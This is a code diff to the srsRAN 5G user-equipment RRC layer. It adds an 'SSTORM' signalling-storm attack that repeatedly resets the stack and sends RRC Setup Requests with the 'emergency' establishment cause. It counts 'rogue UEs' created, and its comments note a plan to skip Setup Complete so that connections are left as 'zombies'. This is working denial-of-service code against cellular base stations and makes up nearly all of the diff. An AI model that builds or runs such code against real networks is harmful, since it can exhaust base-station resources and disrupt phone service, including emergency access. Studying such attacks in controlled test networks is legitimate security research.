@@ -27,6 +27,7 @@
 #include "srsran/interfaces/ue_rlc_interfaces.h"
 #include "srsue/hdr/stack/rrc_nr/rrc_nr_procedures.h"
 #include "srsue/hdr/stack/upper/usim.h"
+#include <srsran/phy/phch/phch_cfg_nr.h>
 
 using namespace asn1::rrc_nr;
 using namespace asn1;
@@ -120,6 +121,10 @@ int rrc_nr::init(phy_interface_rrc_nr*       phy_,
 
   running               = true;
   sim_measurement_timer = task_sched.get_unique_timer();
+
+  // !VI - timer initialization
+  sstorm_unique_timer = task_sched.get_unique_timer();
+
   return SRSRAN_SUCCESS;
 }
 
@@ -244,7 +249,12 @@ void rrc_nr::in_sync() {}
 void rrc_nr::out_of_sync() {}
 
 // MAC interface
-void rrc_nr::run_tti(uint32_t tti) {}
+void rrc_nr::run_tti(uint32_t tti) {
+  // !vi - process ongoing processes in callback list
+  // helped setup_request_proc to process
+  callback_list.run();
+
+}
 
 // PDCP interface
 void rrc_nr::write_pdu(uint32_t lcid, srsran::unique_byte_buffer_t pdu)
@@ -382,7 +392,30 @@ void rrc_nr::decode_pdu_bcch_dlsch(srsran::unique_byte_buffer_t pdu)
 
 void rrc_nr::set_phy_default_config()
 {
+  // !VI - clear phy config for fresh ue start
+  srsran::console("[SSTORM] [PHY_CFG] Before reset: dl_freq=%.0f Hz\n", phy_cfg.carrier.dl_center_frequency_hz);
+  
+
+  // !vi save to reuse
+  srsran_carrier_nr_t carrier_copy = phy_cfg.carrier;
+  phy_cfg_nr_t::ssb_cfg_t ssb_copy = phy_cfg.ssb;
+  srsran_duplex_config_nr_t duplex_copy = phy_cfg.duplex;
+  srsran_prach_cfg_t prach_copy = phy_cfg.prach;  // PRACH Confif from SIB1
+  srsran_pdcch_cfg_nr_t pdcch_copy = phy_cfg.pdcch;  // PDCCH (corset 0) from SIB1
+  srsran_sch_hl_cfg_nr_t pusch_copy = phy_cfg.pusch;
+
+  // clear everything 
   phy_cfg = {};
+
+  // !vi restore config to save time
+  phy_cfg.carrier = carrier_copy;
+  phy_cfg.ssb = ssb_copy;
+  phy_cfg.duplex = duplex_copy;
+  phy_cfg.prach = prach_copy;   // For RACH
+  phy_cfg.pdcch = pdcch_copy;   // For RAR reception
+  phy_cfg.pusch = pusch_copy;
+
+  srsran::console("[SSTORM] [PHY_CFG] After reset: dl_freq=%.0f Hz\n", phy_cfg.carrier.dl_center_frequency_hz);
 
   // uses default values provided in 38.311 TS 138 331 V16.6 page 361
   if (make_phy_beta_offsets({}, &phy_cfg.pusch.beta_offsets) == false) {
@@ -408,7 +441,9 @@ void rrc_nr::handle_sib1(const sib1_s& sib1)
 {
   if (meas_cells.serving_cell().has_sib1()) {
     logger.info("SIB1 already processed");
-    return;
+    // !vi - continue even if the sib1 is already processed without returning
+    // return;
+    srsran::console("[SSTORM] [SIB1] already processed, continuing anyways\n");
   }
 
   meas_cells.serving_cell().set_sib1(sib1);
@@ -553,6 +588,7 @@ bool rrc_nr::is_connected()
 
 int rrc_nr::connection_request(srsran::nr_establishment_cause_t cause, srsran::unique_byte_buffer_t dedicated_info_nas_)
 {
+  srsran::console("[SSTORM] [CONN_REQ] connection_request() called with cause=%d\n", (int)cause);
   if (not setup_req_proc.launch(cause, std::move(dedicated_info_nas_))) {
     logger.error("Failed to initiate setup request procedure");
     return SRSRAN_ERROR;
@@ -961,15 +997,31 @@ bool rrc_nr::rrc_reconfiguration(bool endc_release_and_add_r15, const asn1::rrc_
 
 void rrc_nr::rrc_release()
 {
+  srsran::console("[SSTORM] rrc_release called (state prior=%s)\n", rrc_nr_state_text[state]);
+  
   rlc->reset();
   pdcp->reset();
   mac->reset();
+
+  // !vi - Re-Setup CCCH (LCID=0) after MAC reset
+  // NOTE: MAC reset clears logical_channels, so CCCH must be reconfigured
+  // otherwise, Msg3 cannot read RRC Setup Request from RLC during RACH
+  logical_channel_config_t lch = {};
+  mac->setup_lcid(lch);
+  srsran::console("[SSTORM] [RRC-RELEASE] CCCH (LCID=0) reconfigured after MAC reset\n");
+
   lcid_drb.clear();
 
   // Apply actions only applicable in SA mode
   if (rrc_eutra == nullptr) {
     stack->reset_eps_bearers();
   }
+
+  // !vi - set state to IDLE after release
+  state = RRC_NR_STATE_IDLE;
+  // reset PHY config to clear stale PUCCH resources
+  set_phy_default_config();
+  srsran::console("[SSTORM] [RRC-RELEASE] Complete: state= IDLE\n");
 }
 
 int rrc_nr::get_nr_capabilities(srsran::byte_buffer_t* nr_caps_pdu)
@@ -2206,7 +2258,42 @@ bool rrc_nr::handle_rrc_setup(const rrc_setup_s& setup)
   state = RRC_NR_STATE_CONNECTED;
   srsran::console("RRC Connected\n");
 
-  // defer transmission of Setup Complete until PHY reconfiguration has been completed
+  // !vi cache cell info on first ssuccessful connection
+  // use phy config directly as we get it from the first connectin
+  if (!sstorm_cache_cell) {
+    sstorm_cached_pci = phy_cfg.carrier.pci;
+    sstorm_cached_freq = phy_cfg.carrier.dl_center_frequency_hz;
+    sstorm_cache_cell = true;
+    srsran::console("[SSTORM] [CACHE] PCI: %d, freq: %.0f", sstorm_cached_pci, sstorm_cached_freq);
+  }
+
+  if (sstorm_active) {
+    sstorm_rogue_ue_created++;
+    sstorm_consecutive_failures = 0; // reset (assuming this is the success)
+
+    srsran::console("[SSTORM] [PROGRESS]  #%d rogue ues created (and sent)\n", sstorm_rogue_ue_created);
+
+    if (sstorm_rogue_ue_created >= sstorm_max_rogue) {
+      srsran::console("[SSTORM] [ROGUE] %d/%d of rogue ue completed\n", sstorm_rogue_ue_created, sstorm_max_rogue);
+      sstorm_active = false;
+      // !vi TODO: remove comment and return true;  // not sending RRC Setup Complete (msg5) to stay in "zombie" state
+    }
+
+    srsran::console("[SSTORM] cycle #%d starting without sending msg5....", sstorm_rogue_ue_created + 1);
+
+    // !VI LOCAL RESET - just  clear the RNTIs
+    state = RRC_NR_STATE_IDLE;
+    mac->reset();   // rnti is cleared
+
+    // reconfigure lch to set CCCH (lcid 0) for new RRCSetupRequest
+    logical_channel_config_t lch = {};
+    mac->setup_lcid(lch);
+
+    // immediatel send another cycle
+    set_timer_and_run_attack();
+    // !vi TODO: remove comment and return true; // return success but skip msg5 transmission 
+  }
+  // !vi NORMAL UE OP: defer transmission of Setup Complete until PHY reconfiguration has been completed
   if (not conn_setup_proc.launch(
           setup.crit_exts.rrc_setup().radio_bearer_cfg, cell_group, std::move(dedicated_info_nas))) {
     logger.error("Failed to initiate connection setup procedure");
@@ -2374,6 +2461,145 @@ void rrc_nr::set_phy_config_complete(bool status)
       break;
   }
   phy_cfg_state = PHY_CFG_STATE_NONE;
+}
+
+// !VI THE GEM
+//
+// THE ENTRY POINT
+void rrc_nr::sstorm_start() {
+  srsran::console("[SSTORM] [STARTING] === === SIGNAL STORMING === ===\n");
+
+  // initialization on first cycle
+  sstorm_active = true;
+  sstorm_cycle_count = 0;
+  sstorm_rogue_ue_created = 0;
+  sstorm_consecutive_failures = 0;
+  sstorm_cache_cell = false;
+  sstorm_cached_pci = 0;
+  sstorm_cached_freq = 0;
+
+  if (state == RRC_NR_STATE_CONNECTED) {
+    srsran::console("[SSTORM] [RRC_STATE_CONNECTED] DISCONNECTING...\n");
+    rrc_release();
+    state = RRC_NR_STATE_IDLE;
+
+    srsran::console("[SSTORM] [STARTING UP] First Cycle\n");
+    set_timer_and_run_attack();
+  } else if (state == RRC_NR_STATE_IDLE) {
+    srsran::console("[SSTORM] [RRC_STATE_IDLE] STARTING CYCLE NOW!!...\n");
+    set_timer_and_run_attack();
+  } else {
+    srsran::console("[SSTORM] [UNKNOWN_STATE] SETTING TO IDLE ANYWAYS...\n");
+    rrc_release();
+    state = RRC_NR_STATE_IDLE;
+
+    srsran::console("[SSTORM] [STARTING UP] First Cycle\n");
+    set_timer_and_run_attack();
+  }
+}
+
+void rrc_nr::sstorm_unique_timer_expired() {
+  if (!sstorm_active) {
+    srsran::console("[SSTORM] attack stopped\n");
+    return;
+  }
+
+  if (sstorm_rogue_ue_created >= sstorm_max_rogue) {
+    srsran::console("[SSTORM] Attack Completed: %d Rogues Sent", sstorm_rogue_ue_created);
+    return;
+  }
+  
+  if (sstorm_consecutive_failures >= sstorm_max_consecutive_failures) {
+    srsran::console("[SSTORM] reached max consecutive failures, aborting\n");
+    sstorm_active = false;
+    return;
+  }
+
+  sstorm_cycle_count++;
+
+  // connection establishment cause: emergency!
+  srsran::nr_establishment_cause_t cause;
+  cause = srsran::nr_establishment_cause_t::emergency;
+
+  // fast path
+  // if it's once connected, we can skip some stuffs
+  if (sstorm_cache_cell && state == RRC_NR_STATE_IDLE && plmn_is_selected) {
+    srsran::console("[FAST-SSTORM] Cycle %d (SKIPPED CELL SELECTION)\n", sstorm_cycle_count);
+
+    state = RRC_NR_STATE_IDLE;
+    stop_all_rrc_timers();
+    //immediately restart T300
+    t300.run();
+
+    send_setup_request(cause);
+    return;
+  }
+
+  // slow-path: first time or after failure
+  srsran::console("[SSTORM] Cycle %d (SLOW PATH - cell selection needed)\n", sstorm_cycle_count);
+  
+  // force local stack reset
+  srsran::console("[SSTORM] Forcing Stack Reset...\n");
+  rrc_release();
+  stop_all_rrc_timers();
+
+  // important: recreate procedure if stuck - fixed a lot of headaches
+  if (setup_req_proc.is_busy()) {
+    srsran::console("[SSTORM] [DEBUG-STEP] Recreating Stuck setup_req_proc\n");
+    setup_req_proc.~proc_t<setup_request_proc>();
+    new (&setup_req_proc) proc_t<setup_request_proc>(*this);
+    srsran::console("[SSTORM] [DEBUG] After recreation, is_busy()=%d\n", setup_req_proc.is_busy());
+  }
+
+  if (cell_selector.is_busy()) {
+    srsran::console("[SSTORM] [DEBUG-STEP] Recreating Stuck cell_selector\n");
+    cell_selector.~proc_t<cell_selection_proc, rrc_cell_search_result_t>();
+    new (&cell_selector) proc_t<cell_selection_proc, rrc_cell_search_result_t>(*this);
+  }
+
+  if (state != RRC_NR_STATE_IDLE || !plmn_is_selected) {
+    srsran::console("[SSTORM] Stack Not Ready (state = %d, plmn = %d), Retrying...", state, plmn_is_selected);
+    sstorm_consecutive_failures++;
+    set_timer_and_run_attack();
+    return;
+  }
+
+  if (setup_req_proc.is_busy()) {
+    srsran::console("[SSTORM] [DEBUG] setup_req_proc still busy after recreation. Retrying...\n");
+    sstorm_consecutive_failures++;
+    set_timer_and_run_attack();
+  }
+  
+  // Finally lets send the connection request
+  srsran::console("[SSTORM] Triggering connection request (cause=%d)\n", (int)cause);
+
+  if (connection_request(cause, nullptr) != SRSRAN_SUCCESS) {
+    srsran::console("[SSTORM] connection_request() Failes. Retrying...");
+    sstorm_consecutive_failures++;
+    set_timer_and_run_attack();
+    return;
+  }
+
+  srsran::console("[SSTORM] Connectinon Request Sent, waiting for RRC Setup (Msg4) to be received...\n");
+
+}
+
+// Attack Helpers
+//
+// stop all RRC timers
+void rrc_nr::stop_all_rrc_timers()
+{
+  if (t300.is_running()) t300.stop();
+  if (t301.is_running()) t301.stop();
+  if (t304.is_running()) t304.stop();
+  if (t310.is_running()) t310.stop();
+  if (t311.is_running()) t311.stop();
+}
+
+void rrc_nr::set_timer_and_run_attack() 
+{
+  sstorm_unique_timer.set(sstorm_cycle_interval_ms, [this](uint32_t tid) { sstorm_unique_timer_expired(); });
+  sstorm_unique_timer.run();
 }
 
 } // namespace srsue
